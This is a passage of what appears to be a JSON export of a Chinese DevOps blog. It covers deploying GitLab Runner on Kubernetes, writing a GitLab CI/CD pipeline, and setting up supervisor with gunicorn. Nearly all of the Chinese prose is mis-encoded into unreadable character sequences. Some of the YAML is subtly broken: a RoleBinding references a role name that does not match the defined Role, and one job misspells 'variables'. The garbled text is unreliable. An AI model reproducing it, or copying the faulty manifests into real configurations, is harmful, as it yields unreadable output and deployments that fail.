ConfigMapï¼Œç”¨äºæ³¨å…¥ runner é…ç½®ä¸€ä¸ª Deploymentï¼Œç”¨äºè¿è¡Œ runner daemonä¸€ä¸ª ServiceAccountï¼Œç”¨äºç»™ daemon ä½¿ç”¨ï¼Œæ¥å¯åŠ¨ podï¼Œä¸ºè¿è¡Œä»»åŠ¡æä¾›ç¯å¢ƒï¼ˆå½“ç„¶ï¼Œç”¨ defaultï¼‰ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ä¸€ä¸ª Role + RoleBindingï¼Œä¸ºä¸Šé¢çš„ ServiceAccount èµ‹äºˆ pods å’Œ pods/exec æƒé™runner çš„é…ç½®æ³¨å…¥æœ‰ä¸¤ç§æ–¹å¼ï¼šå…ˆåœ¨ GitLab ä¸­æ³¨å†Œå¥½ runnerï¼Œç„¶ååœ¨ ConfigMap ä¸­å†™å¥½é…ç½®æ–‡ä»¶ï¼Œå¹¶åœ¨ Deployment ä¸­ä½œä¸ºä¸€ä¸ª Volume æŒ‚è½½åˆ°é…ç½®ç›®å½•ä¸‹ã€‚è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ä¸­æ¨èçš„åšæ³•ï¼›åœ¨ ConfigMap ä¸­å®šä¹‰ç¯å¢ƒå˜é‡ï¼Œå¹¶åœ¨ pod template çš„ envFrom å±æ€§ä¸­å®šä¹‰ä¸€ä¸ª configMapRef æ¥æ³¨å…¥ç¯å¢ƒå˜é‡ï¼Œå¹¶åœ¨ pod å¯åŠ¨æ—¶å½“åœºæ³¨å†Œä¸€ä¸ª runnerï¼›åœ¨ pod è¢«åœæ­¢å‰å†è°ƒç”¨å‘½ä»¤å°†è¿™ä¸ª runner æ³¨é”€æ‰ï¼ˆæ¨èï¼Œå¦åˆ™ GitLab åå°ä¼šçœ‹åˆ°å¾ˆå¤šç¦»çº¿çš„ runnerï¼‰ã€‚ç”±äºç¼–è¾‘å™¨çš„é«˜äº®è§„åˆ™é€šå¸¸ä¸ä¼šå¤„ç†ä¸€ä¸ªæ–‡ä»¶é‡Œå‡ºç°ä¸¤ç§ä¸åŒè¯­è¨€çš„æƒ…å†µï¼Œåœ¨ ConfigMap é‡Œå†™ toml ä¼šå¾ˆæŒ£æ‰ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨çš„æ˜¯ç¬¬äºŒç§æ³¨å…¥æ–¹å¼ã€‚å®Œæ•´çš„é…ç½®æ–‡ä»¶ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136apiVersion: v1kind: Namespacemetadata: name: cicd---apiVersion: v1kind: ServiceAccountmetadata: name: executor namespace: cicdimagePullSecrets:- name: dockersecret---apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: namespace: cicd name: executor-rolerules: # runner è¦æ–°å»º podï¼Œæ‰€ä»¥ä¸ºå®ƒèµ‹äºˆ pod ç›¸å…³çš„æƒé™ - apiGroups: [\"\"] resources: [\"pods\", \"pods/exec\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\", \"delete\"]---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: namespace: cicd name: executor-rolebindingsubjects:- kind: ServiceAccount name: executor namespace: cicdroleRef: kind: Role name: executor apiGroup: rbac.authorization.k8s.io---apiVersion: v1kind: ConfigMapmetadata: namespace: cicd labels: app: gitlab-deployer name: gitlab-runner-cmdata: # å…·ä½“å¯ç”¨çš„å‚æ•°é…ç½®ä»¥åŠç¯å¢ƒå˜é‡é…ç½®å¯ä»¥è¿è¡Œ gitlab-runner register --help æŸ¥çœ‹ REGISTER_NON_INTERACTIVE: \"true\" REGISTER_LOCKED: \"false\" CI_SERVER_URL: \"https://gitlab.com/ci\" METRICS_SERVER: \"0.0.0.0:9100\" RUNNER_CONCURRENT_BUILDS: \"4\" RUNNER_REQUEST_CONCURRENCY: \"4\" RUNNER_TAG_LIST: \"tag1,tag2\" RUNNER_EXECUTOR: \"kubernetes\" KUBERNETES_NAMESPACE: \"cicd\" KUBERNETES_SERVICE_ACCOUNT: \"executor\" KUBERNETES_CPU_LIMIT: \"100m\" KUBERNETES_MEMORY_LIMIT: \"100Mi\" KUBERNETES_SERVICE_CPU_LIMIT: \"100m\" KUBERNETES_SERVICE_MEMORY_LIMIT: \"100Mi\" KUBERNETES_HELPER_CPU_LIMIT: \"100m\" KUBERNETES_HELPER_MEMORY_LIMIT: \"100Mi\" KUBERNETES_PULL_POLICY: \"if-not-present\" KUBERNETES_TERMINATIONGRACEPERIODSECONDS: \"10\" KUBERNETES_POLL_INTERVAL: \"5\" KUBERNETES_POLL_TIMEOUT: \"360\" KUBERNETES_IMAGE: \"kubectl:1.8.1\"---apiVersion: apps/v1beta2kind: Deploymentmetadata: name: runner namespace: cicd labels: app: runnerspec: replicas: 1 selector: matchLabels: app: runner template: metadata: labels: app: runner spec: containers: - name: ci-builder image: gitlab/gitlab-runner:v10.6.0 command: # å‘½ä»¤æœ‰ç‚¹é•¿ï¼Œåšäº†ä»¥ä¸‹å‡ æ­¥ï¼šæ³¨é”€å½“å‰çš„ runner name ä»¥é˜²æ­¢ runner å†²çªï¼›æ³¨å†Œæ–°çš„ runnerï¼›å¯åŠ¨ runner daemon - /bin/bash - -c - \"/usr/bin/gitlab-runner unregister -n $RUNNER_NAME || true; /usr/bin/gitlab-runner register; exec /usr/bin/gitlab-runner run\" imagePullPolicy: IfNotPresent envFrom: # é€šè¿‡ ConfigMap æ³¨å…¥ runner é…ç½® - configMapRef: name: gitlab-runner-cm env: # é€šè¿‡ Secret æ³¨å…¥ä¸ GitLab å®ä¾‹è¿›è¡Œäº¤äº’æ‰€ç”¨çš„ CI Token # runner å‘½ä»¤ä¼šè‡ªåŠ¨ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–è¿™ä¸ª tokenï¼Œç”¨äºæ³¨å†Œ runner - name: CI_SERVER_TOKEN valueFrom: secretKeyRef: name: gitlab-ci-token key: token # åŠ¨æ€æ³¨å…¥ç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨ pod name ä½œä¸º runner name # åˆšæŸ¥äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå¦‚æœä¸é€šè¿‡ç¯å¢ƒå˜é‡æŒ‡å®š runner name çš„è¯ï¼Œä¼šç”¨å½“å‰ç¯å¢ƒçš„ hostnameï¼Œä¹Ÿå°±æ˜¯ pod name æ¥åš runner name # é‚£å®Œå…¨æ²¡å¿…è¦æŠŠè¿™ä¸ª pod name æ³¨å†Œè¿›å»å˜›â€¦ - name: RUNNER_NAME valueFrom: fieldRef: fieldPath: metadata.name # gitlab-runner è‡ªå¸¦ Prometheus metrics serverï¼Œé€šè¿‡ä¸Šé¢çš„ METRICS_SERVER ç¯å¢ƒå˜é‡é…ç½® # å¼ºçš„ä¸€æ¯”ï¼ ports: - containerPort: 9100 name: http-metrics protocol: TCP resources: limits: cpu: \"100m\" memory: \"100Mi\" requests: cpu: \"100m\" memory: \"100Mi\" lifecycle: # åœ¨ pod åœæ­¢å‰ï¼Œæ³¨é”€è¿™ä¸ª runner preStop: exec: command: - /bin/bash - -c - \"/usr/bin/gitlab-runner unregister -n $RUNNER_NAME\" restartPolicy: Alwaysè¿™é‡Œæ³¨æ„ä¸¤ç‚¹ï¼šKubernetes executor ä¸æ”¯æŒåœ¨è¿è¡Œ job æ˜¯ä½¿ç”¨ service aliasï¼Œæ‰€ä»¥è®¿é—®æœåŠ¡æ—¶éƒ½è¦é€šè¿‡ 127.0.0.1 æ¥è®¿é—®ï¼›ä½ å¯èƒ½æ³¨æ„åˆ°ï¼Œé…ç½®é‡Œå‡ºç°äº†ä¸‰ç§ resource limit é…ç½®ï¼šKUBERNETES_CPU_LIMIT, KUBERNETES_SERVICE_CPU_LIMIT, KUBERNETES_HELPER_CPU_LIMITï¼Œè¿™é‡Œä¸‰ä¸ªé…ç½®å°†åº”ç”¨äº kubernetes job pod ä¸­çš„ä¸‰ç±»å®¹å™¨ï¼Œç¬¬ä¸€ç±»ç”¨äºå®é™…æ‰§è¡Œå‘½ä»¤ï¼Œç¬¬äºŒç±»ï¼ˆservice å®¹å™¨ï¼‰ç”¨äºå¯åŠ¨ job æ‰€éœ€çš„ serviceï¼Œç¬¬ä¸‰ç±»ï¼ˆhelper å®¹å™¨ï¼‰ç”¨äºä»»åŠ¡æ‰§è¡Œä¹‹å‰çš„ä»£ç æ‹‰å–ï¼Œä»¥åŠä»»åŠ¡æ‰§è¡Œä¹‹åæ„å»ºäº§ç‰©ï¼ˆartifactï¼‰çš„ä¸Šä¼ ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ¥ä¸ºä¸‰ç§å®¹å™¨èµ‹äºˆä¸åŒçš„èµ„æºé™åˆ¶ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Docker å’Œ Kubernetes ç¯å¢ƒä¸‹éƒ¨ç½² GitLab Runner.","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD åŸºç¡€æ•™ç¨‹ï¼ˆä¸€ï¼‰","slug":"gitlab-cicd-fundmental","date":"2018-06-06T07:46:00.000Z","updated":"2018-06-06T08:37:58.796Z","comments":true,"path":"2018/06/gitlab-cicd-fundmental/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-fundmental/","excerpt":"æœ€è¿‘ç©äº† GitLab CI/CD å¹³å°ï¼Œé€šè¿‡æ­å»ºè¿™ä¸ªå¹³å°ä¹Ÿæ”¶è·äº†ä¸€äº›å…³äº DevOps çš„åŸºæœ¬æŠ€èƒ½ï¼Œæ‰“ç®—é€šè¿‡å‡ ç¯‡æ–‡ç« æ¥è®²è¿°ä¸€ä¸‹ GitLab CI/CD å¹³å°çš„æ„å»ºåŠåº”ç”¨ã€‚æœ¬æ–‡å¯¹ GitLab CI/CD ä»¥åŠ CI/CD æµç¨‹å®šä¹‰æ–‡ä»¶çš„å†™æ³•åšäº†ç®€è¦ä»‹ç»ã€‚","text":"æœ€è¿‘ç©äº† GitLab CI/CD å¹³å°ï¼Œé€šè¿‡æ­å»ºè¿™ä¸ªå¹³å°ä¹Ÿæ”¶è·äº†ä¸€äº›å…³äº DevOps çš„åŸºæœ¬æŠ€èƒ½ï¼Œæ‰“ç®—é€šè¿‡å‡ ç¯‡æ–‡ç« æ¥è®²è¿°ä¸€ä¸‹ GitLab CI/CD å¹³å°çš„æ„å»ºåŠåº”ç”¨ã€‚æœ¬æ–‡å¯¹ GitLab CI/CD ä»¥åŠ CI/CD æµç¨‹å®šä¹‰æ–‡ä»¶çš„å†™æ³•åšäº†ç®€è¦ä»‹ç»ã€‚å‰å‡ ä¸ªæœˆå…¬å¸æŠ€æœ¯æ”¹è¿›ï¼ŒæŸäº›ä¸šåŠ¡éƒ¨ç½²åœ¨ k8s é›†ç¾¤ä¸­ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹é€šè¿‡ GitLab è‡ªå¸¦çš„ CI/CD åŠŸèƒ½æ¥å®ç°æœåŠ¡çš„æµ‹è¯•ã€æ„å»ºåŠéƒ¨ç½²ï¼Œæ‰€ä»¥æ‰æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚ 1. åŸºæœ¬æ¦‚å¿µ 1.1 CI/CDCIï¼ŒContinuous Integrationï¼Œä¸ºæŒç»­é›†æˆã€‚å³åœ¨ä»£ç æ„å»ºè¿‡ç¨‹ä¸­æŒç»­åœ°è¿›è¡Œä»£ç çš„é›†æˆã€æ„å»ºã€ä»¥åŠè‡ªåŠ¨åŒ–æµ‹è¯•ç­‰ï¼›æœ‰äº† CI å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»£ç æäº¤çš„è¿‡ç¨‹ä¸­é€šè¿‡å•å…ƒæµ‹è¯•ç­‰å°½æ—©åœ°å‘ç°å¼•å…¥çš„é”™è¯¯ï¼›CDï¼ŒContinuous Deploymentï¼Œä¸ºæŒç»­äº¤ä»˜ã€‚åœ¨ä»£ç æ„å»ºå®Œæ¯•åï¼Œå¯ä»¥æ–¹ä¾¿åœ°å°†æ–°ç‰ˆæœ¬éƒ¨ç½²ä¸Šçº¿ï¼Œè¿™æ ·æœ‰åˆ©äºå¿«é€Ÿè¿­ä»£å¹¶äº¤ä»˜äº§å“ã€‚ 1.2 GitLab CI/CDGitLab CI/CDï¼ˆåç®€ç§° GitLab CIï¼‰æ˜¯ä¸€å¥—åŸºäº GitLab çš„ CI/CD ç³»ç»Ÿï¼Œå¯ä»¥è®©å¼€å‘äººå‘˜é€šè¿‡ .gitlab-ci.yml åœ¨é¡¹ç›®ä¸­é…ç½® CI/CD æµç¨‹ï¼Œåœ¨æäº¤åï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨/æ‰‹åŠ¨åœ°æ‰§è¡Œä»»åŠ¡ï¼Œå®Œæˆ CI/CD æ“ä½œã€‚è€Œä¸”ï¼Œå®ƒçš„é…ç½®éå¸¸ç®€å•ï¼ŒCI Runner ç”± Go è¯­è¨€ç¼–å†™ï¼Œæœ€ç»ˆæ‰“åŒ…æˆå•æ–‡ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦ä¸€ä¸ª Runner ç¨‹åºã€ä»¥åŠä¸€ä¸ªç”¨äºè¿è¡Œ jobs çš„æ‰§è¡Œå¹³å°ï¼ˆå¦‚è£¸æœº+SSHï¼ŒDocker æˆ– Kubernetes ç­‰ï¼Œæˆ‘æ¨èç”¨ Dockerï¼Œå› ä¸ºæ­å»ºç›¸å½“å®¹æ˜“ï¼‰å³å¯è¿è¡Œä¸€å¥—å®Œæ•´çš„ CI/CD ç³»ç»Ÿã€‚ä¸‹é¢é’ˆå¯¹ Gitlab CI å¹³å°çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µåšä¸€ä¸ªç®€å•ä»‹ç»ï¼šJobJob ä¸ºä»»åŠ¡ï¼Œæ˜¯ GitLab CI ç³»ç»Ÿä¸­å¯ä»¥ç‹¬ç«‹æ§åˆ¶å¹¶è¿è¡Œçš„æœ€å°å•ä½ã€‚åœ¨æäº¤ä»£ç åï¼Œå¼€å‘è€…å¯ä»¥é’ˆå¯¹ç‰¹å®šçš„ commit å®Œæˆä¸€ä¸ªæˆ–å¤šä¸ª jobï¼Œä»è€Œè¿›è¡Œ CI/CD æ“ä½œã€‚PipelinePipeline å³æµæ°´çº¿ï¼Œå¯ä»¥åƒæµæ°´çº¿ä¸€æ ·æ‰§è¡Œå¤šä¸ª Job.åœ¨ä»£ç æäº¤æˆ– MR è¢«åˆå¹¶æ—¶ï¼ŒGitLab å¯ä»¥åœ¨æœ€æ–°ç”Ÿæˆçš„ commit ä¸Šå»ºç«‹ä¸€ä¸ª pipelineï¼Œåœ¨åŒä¸€ä¸ª pipeline ä¸Šäº§ç”Ÿçš„å¤šä¸ªä»»åŠ¡ä¸­ï¼Œæ‰€ç”¨åˆ°çš„ä»£ç ç‰ˆæœ¬æ˜¯ä¸€è‡´çš„ã€‚Stageä¸€èˆ¬çš„æµæ°´çº¿é€šå¸¸ä¼šåˆ†ä¸ºå‡ æ®µï¼›åœ¨ pipeline ä¸­ï¼Œå¯ä»¥å°†å¤šä¸ªä»»åŠ¡åˆ’åˆ†åœ¨å¤šä¸ªé˜¶æ®µä¸­ï¼Œåªæœ‰å½“å‰ä¸€é˜¶æ®µçš„æ‰€æœ‰ä»»åŠ¡éƒ½æ‰§è¡ŒæˆåŠŸåï¼Œä¸‹ä¸€é˜¶æ®µçš„ä»»åŠ¡æ‰å¯è¢«æ‰§è¡Œã€‚æ³¨ï¼šå¦‚æœæŸä¸€é˜¶æ®µçš„ä»»åŠ¡å‡è¢«è®¾å®šä¸ºâ€œå…è®¸å¤±è´¥â€ï¼Œé‚£è¿™ä¸ªé˜¶æ®µçš„ä»»åŠ¡æ‰§è¡Œæƒ…å†µï¼Œä¸ä¼šå½±å“åˆ°ä¸‹ä¸€é˜¶æ®µçš„æ‰§è¡Œã€‚ä¸Šå›¾ä¸­ï¼Œæ•´æ¡æµæ°´çº¿ä»å·¦å‘å³ä¾æ¬¡æ‰§è¡Œï¼Œæ¯ä¸€åˆ—å‡ä¸ºä¸€ä¸ªé˜¶æ®µï¼Œè€Œåˆ—ä¸­çš„æ¯ä¸ªå¯æ“æ§å…ƒç´ å‡ä¸ºä»»åŠ¡ã€‚å·¦è¾¹ä¸¤ä¸ªé˜¶æ®µçš„ä»»åŠ¡æ˜¯è‡ªåŠ¨æ‰§è¡Œçš„ä»»åŠ¡ï¼Œåœ¨ commit æäº¤åå³å¯è‡ªåŠ¨å¼€å§‹è¿è¡Œï¼Œæ‰§è¡ŒæˆåŠŸæˆ–å¤±è´¥åï¼Œå¯ä»¥ç‚¹å‡»ä»»åŠ¡å³è¾¹çš„æŒ‰é’®é‡è¯•ï¼›è€Œå³è¾¹ä¸¤ä¸ªæ˜¯æ‰‹åŠ¨è§¦å‘ä»»åŠ¡ï¼Œéœ€è¦äººå·¥ç‚¹å‡»å³è¾¹çš„â€œæ’­æ”¾â€æŒ‰é’®æ¥æ‰‹åŠ¨è¿è¡Œã€‚ 2. CI/CD æµç¨‹é…ç½® 2.1 å®Œæ•´å®šä¹‰GitLab å…è®¸åœ¨é¡¹ç›®ä¸­ç¼–å†™ .gitlab-ci.yml æ–‡ä»¶ï¼Œæ¥é…ç½® CI/CD æµç¨‹ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ªç®€å•çš„æµ‹è¯•â†’æ„å»ºâ†’éƒ¨ç½²çš„ CI/CD æµç¨‹ã€‚é¦–å…ˆï¼Œå¯ä»¥å®šä¹‰æµç¨‹æ‰€åŒ…å«çš„é˜¶æ®µã€‚æˆ‘ä»¬çš„æµç¨‹åŒ…å«ä¸‰ä¸ªé˜¶æ®µï¼šæµ‹è¯•ã€æ„å»ºå’Œéƒ¨ç½²ã€‚åœ¨ .gitlab-ci.yml çš„å¼€å¤´ï¼Œå®šä¹‰å¥½æ‰€æœ‰é˜¶æ®µã€ä»¥åŠæ‰§è¡Œæ¯ä¸ªä»»åŠ¡ä¹‹å‰æ‰€éœ€è¦çš„ç¯å¢ƒå˜é‡ä»¥åŠå‡†å¤‡å·¥ä½œï¼Œç„¶åå®šä¹‰æ•´ä¸ªæµç¨‹ä¸­åŒ…å«çš„æ‰€æœ‰ä»»åŠ¡ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253stages: - test - build - deployvariables: IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125;before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125;test_all: image: \"pymicro\" stage: test services: - name: mysql:5.6 alias: mysql veriables: MYSQL_DATABASE: db MYSQL_ROOT_PASSWORD: password before_script: - pip install -U -r requirements.txt script: - flake8 app - pytest testsbuild_image: image: \"docker:17.11\" stage: build services: - name: \"docker:17.12.0-ce-dind\" alias: dockerd variables: DOCKER_HOST: tcp://dockerd:2375 only: - master tags: - build script: - docker build -t $&#123;IMAGE_TAG&#125; -f Dockerfile . - docker push $&#123;IMAGE_TAG&#125;deploy_production: stage: deploy variables: GIT_STRATEGY: none only: - master when: manual tags: - deploy-production script: - kubectl set image deploy/myproject \"app=$&#123;IMAGE_TAG&#125;\" --recordåœ¨æ¯ä¸ªä»»åŠ¡ä¸­ï¼Œé€šå¸¸ä¼šåŒ…å« image, stage,services, script ç­‰å­—æ®µã€‚å…¶ä¸­ï¼Œstage å®šä¹‰äº†ä»»åŠ¡æ‰€å±çš„é˜¶æ®µï¼›image å­—æ®µæŒ‡å®šäº†æ‰§è¡Œä»»åŠ¡æ—¶æ‰€éœ€è¦çš„ docker é•œåƒï¼›services æŒ‡å®šäº†æ‰§è¡Œä»»åŠ¡æ—¶æ‰€éœ€çš„ä¾èµ–æœåŠ¡ï¼ˆå¦‚æ•°æ®åº“ã€Docker æœåŠ¡å™¨ç­‰ï¼‰ï¼›è€Œ script ç›´æ¥å®šä¹‰äº†ä»»åŠ¡æ‰€éœ€æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹æ¯ä¸ªé˜¶æ®µä¸­çš„ä»»åŠ¡ã€‚ 2.2 æµ‹è¯•åœ¨æµ‹è¯•ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å¯åŠ¨äº† MySQL æœåŠ¡ï¼Œå¹¶é€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥äº† MySQL çš„åˆå§‹æ•°æ®åº“ä»¥åŠ Root å¯†ç ï¼Œåœ¨æœåŠ¡å¯åŠ¨åï¼ŒRunner ä¼šè¿è¡Œ before_script ä¸­çš„å‘½ä»¤æ¥å®‰è£…æ‰€éœ€ä¾èµ–ï¼›å®‰è£…æˆåŠŸåå°±ä¼šè¿è¡Œ script å±æ€§ä¸­çš„å‘½ä»¤æ¥è¿›è¡Œä»£ç é£æ ¼æ£€æŸ¥ä»¥åŠå•å…ƒæµ‹è¯•ï¼›å¯ä»¥æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬çš„ MySQL æœåŠ¡ä¸‹æœ‰ä¸€ä¸ª alias å±æ€§æ ‡è¯†æœåŠ¡åˆ«åã€‚å¦‚æœä½ çš„ Runner è¿è¡Œåœ¨ Docker å¹³å°ä¸‹ï¼Œä½ å¯ä»¥ç›´æ¥é€šè¿‡æœåŠ¡åˆ«åè®¿é—®åˆ°è¯¥æµ‹è¯•ç¯å¢ƒä¸­å¯¹åº”çš„æœåŠ¡ã€‚æ¯”å¦‚åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ mysql://root:password@mysql/db æ¥è®¿é—®æµ‹è¯•æ•°æ®åº“ã€‚ 2.3 æ„å»ºåœ¨æ„å»ºä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ Dockerfile æ³¨å…¥ä¾èµ–ï¼Œå°†å·¥ç¨‹æ‰“åŒ…æˆ Docker é•œåƒå¹¶ä¸Šä¼ ï¼›æˆ‘ä»¬ä¸ºè¿™ä¸ªä»»åŠ¡å®šä¹‰äº†ä¸€äº›é¢å¤–çš„å±æ€§ï¼štag å±æ€§å¯ä»¥æ ‡è®°è¿™ä¸ªä»»åŠ¡å°†åœ¨å«æœ‰ç‰¹å®š tag çš„ CI Runner ä¸Šè¿è¡Œï¼›è€Œ only å±æ€§è¡¨ç¤ºåªæœ‰è¿™ä¸ª commit åœ¨ç‰¹å®šçš„åˆ†æ”¯ä¸‹ï¼ˆå¦‚ masterï¼‰æ—¶ï¼Œæ‰å¯ä»¥åœ¨æ­¤ commit ä¸Šè¿è¡Œè¿™ä¸ªä»»åŠ¡ã€‚only å’Œ except æ”¯æŒå¾ˆå¤šç§ç¯å¢ƒæ¡ä»¶åˆ¤æ–­ï¼Œè¯¦ç»†çš„ç”¨æ³•å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚å¦å¤–ï¼Œæˆ‘ä»¬åœ¨ before_scripts ä¸­ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡æ‹¿åˆ°äº†é¡¹ç›®æ‰€å±çš„ç»„ï¼Œä»¥åŠé¡¹ç›®åç§°ã€‚GitLab ä¼šåœ¨è¿è¡Œä»»åŠ¡å‰ï¼Œå‘ç¯å¢ƒä¸­æ³¨å…¥å¾ˆå¤šç¯å¢ƒå˜é‡ï¼Œæ¥è¡¨æ˜è¿è¡Œç¯å¢ƒä»¥åŠä¸Šä¸‹æ–‡ã€‚æ‰€æœ‰çš„ç¯å¢ƒå˜é‡åˆ—è¡¨å¯ä»¥çœ‹æ–‡æ¡£ã€‚ 2.4 éƒ¨ç½²åœ¨éƒ¨ç½²ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ kubectl set image å‘½ä»¤å°†æˆ‘ä»¬åˆšåˆšæ„å»ºçš„é•œåƒå‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒã€‚è¿™ä¸ªä»»åŠ¡ä¸­çš„ when è¡¨ç¤ºè¿è¡Œè¯¥ä»»åŠ¡æ‰€éœ€è¦çš„å¿…è¦æ¡ä»¶ï¼Œå¦‚å‰ä¸€é˜¶æ®µä»»åŠ¡å…¨éƒ¨æˆåŠŸã€‚when: manual è¡¨ç¤ºè¯¥æ“ä½œåªå…è®¸æ‰‹åŠ¨è§¦å‘ã€‚è¯¥å±æ€§å…·æœ‰å››ä¸ªé€‰é¡¹ï¼Œå…·ä½“è¯·è§æ–‡æ¡£ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬åœ¨ .gitlab-ci.yml ä¸­å®šä¹‰äº†ä¸€å¥—å®Œæ•´çš„æµ‹è¯•â†’æ„å»ºâ†’éƒ¨ç½²æµç¨‹ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"ä½¿ç”¨ supervisor åŠ gunicorn éƒ¨ç½² Web åº”ç”¨","slug":"deploy-apps-with-supervisor-and-gunicorn","date":"2017-03-19T09:00:00.000Z","updated":"2017-06-29T04:38:40.716Z","comments":true,"path":"2017/03/deploy-apps-with-supervisor-and-gunicorn/","link":"","permalink":"https://blog.stdioa.com/2017/03/deploy-apps-with-supervisor-and-gunicorn/","excerpt":"å¾ˆä¹…ä¹‹å‰å°±æƒ³å°è¯•ä¸€ä¸‹ç”¨ supervisor éƒ¨ç½² Web åº”ç”¨ï¼Œå‡ ä¸ªæœˆå‰æŠŠ Python åº”ç”¨çš„æœåŠ¡å™¨éƒ½æ¢æˆäº† gunicornï¼Œä»Šå¤©ç»ˆäºæŠŠè¿›ç¨‹ç®¡ç†æœåŠ¡æ¢æˆäº† supervisor. çœ‹æˆ‘çš„æ‹–å»¶ç—‡ã€‚","text":"å¾ˆä¹…ä¹‹å‰å°±æƒ³å°è¯•ä¸€ä¸‹ç”¨ supervisor éƒ¨ç½² Web åº”ç”¨ï¼Œå‡ ä¸ªæœˆå‰æŠŠ Python åº”ç”¨çš„æœåŠ¡å™¨éƒ½æ¢æˆäº† gunicornï¼Œä»Šå¤©ç»ˆäºæŠŠè¿›ç¨‹ç®¡ç†æœåŠ¡æ¢æˆäº† supervisor. çœ‹æˆ‘çš„æ‹–å»¶ç—‡ã€‚ 1. å‰è¨€ä¹‹å‰ä¸€ç›´åœ¨ç”¨ tmux æ¥æ‰˜ç®¡å„ç§ Web åº”ç”¨è¿›ç¨‹ï¼Œæ„Ÿè§‰è¿™ç§æƒ³æ³•çœŸçš„å¾ˆè ¢ï¼Œäºæ˜¯ä»Šå¤©æŠŠæ‰˜ç®¡æ–¹å¼æ¢æˆäº†æ›´ä¸“ä¸šçš„ supervisorï¼Œå¹¶ç”¨å®ƒæ‰˜ç®¡äº†ä¸‰ä¸ª Django APPï¼Œä¸€ä¸ª flask APPï¼Œè¿˜æœ‰ä¸€ä¸ª node APP.ç®€å•çœ‹çœ‹ä»Šå¤©è¦ç”¨çš„ä¸œè¥¿ï¼šgunicornï¼Œä¸€ä¸ª Python å®ç°çš„ WSGI æœåŠ¡å™¨ï¼›supervisorï¼Œä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·ã€‚Django, Flask, Node.jsï¼Œä¸å¤šè¯´ã€‚ 2. supervisor å®‰è£…åŠåŸºç¡€é…ç½®pip2 install supervisor å³å¯ã€‚æ³¨æ„ï¼Œsupervisor ä¸æ”¯æŒ Python 3.supervisor æä¾›äº†ä¸€ä¸ªé…ç½®ç”Ÿæˆç¨‹åº echo_supervisord_confï¼Œå¯ä»¥ç”¨å®ƒæ¥ç›´æ¥ç”Ÿæˆä¸€ä¸ªå®ä¾‹é…ç½®æ–‡ä»¶ã€‚ç›´æ¥è¾“å…¥ echo_supervisord_conf &gt; /etc/supervisor/supervisord.confï¼Œå°†é…ç½®å†™å…¥æ–‡ä»¶ã€‚éšåï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¼€å¯ http ç®¡ç†æœåŠ¡ï¼š1234[inet_http_server] ; inet (TCP) server disabled by defaultport = 127.0.0.1:9001 ; (ip_address:port specifier, *:port for all iface)username = stdio ; (default is no username (open server))password = password ; (default is no password (open server))æ·»åŠ é€‰é¡¹ï¼ŒåŒ…å«å­ç›®å½• conf.d ä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼š12[include]files = conf.d/*.conféšåï¼Œä½¿ç”¨ sudo supervisord -c /etc/supervisor/supervisord.confï¼Œå¯åŠ¨ supervisor å®ˆæŠ¤è¿›ç¨‹ã€‚é…ç½®ä¸€ä¸‹ Nginxï¼Œç™»å½•ç®¡ç†é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° supervisor 